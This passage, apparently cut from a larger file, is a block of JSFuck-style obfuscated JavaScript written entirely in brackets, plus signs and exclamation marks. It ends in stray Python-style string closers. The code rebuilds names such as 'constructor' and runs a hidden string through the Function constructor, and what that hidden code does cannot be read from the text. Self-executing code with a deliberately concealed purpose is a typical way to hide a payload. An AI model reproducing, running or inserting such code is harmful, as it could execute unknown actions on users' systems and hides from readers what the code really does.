([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+![])[!![]+!![]]+([]+![])[!![]+!![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]])[+([]+(+!![])+(+[]))]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]])[+!![]]+(![]+[+[]]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]])[+([]+(!![]+!![])+(+[]))]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([]+![])[+[]]+([]+!![])[+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]([]+([]+!![])[+!![]]+([]+!![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[!![]+!![]]+([]+!![])[+!![]]+([]+[][[]])[+!![]]+(+[![]]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[+([]+(+!![])+(+!![]))]+([]+!![])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[+!![]]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))+([]+!![])[!![]+!![]+!![]])()(([]+[])[[]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]())[!![]+!![]]+(+([]+(+!![])+(!![]+!![]+!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![])+(+[])))+([]+![])[+!![]]+([]+!![])[+!![]]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]([]+([]+!![])[+!![]]+([]+!![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[!![]+!![]]+([]+!![])[+!![]]+([]+[][[]])[+!![]]+(+[![]]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[+([]+(+!![])+(+!![]))]+([]+!![])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[+!![]]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))+([]+!![])[!![]+!![]+!![]])()(([]+[])[[]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]())[!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([][[]]+[])[!![]+!![]]+([]+!![])[!![]+!![]+!![]]+([][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]]+[])[+([]+(+!![])+(!![]+!![]+!![]))]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))+([]+![])[+!![]]+([]+!![])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[!![]+!![]+!![]]+([]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])))[+[]]+([]+[][[]])[+!![]]+([]+!![])[+![]]+([][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]]+[])[+([]+(+!![])+(!![]+!![]+!![]))]+([]+![])[+[]]+([][[]+([]+![])[!![]+!![]+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[!![]+!![]+!![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+![])[!![]+!![]]](![]+[])+[])[+!![]]+(!![]+!![]+!![]+!![])+([+[]]+![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[+([]+(!![]+!![])+(+[]))]+([+[]]+![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[+([]+(!![]+!![])+(+[]))])())[[]+([][[]+([]+!![])[!![]+!![]+!![]]+([]+[][[]])[+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()+[])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]])[+!![]]]([]))()""")))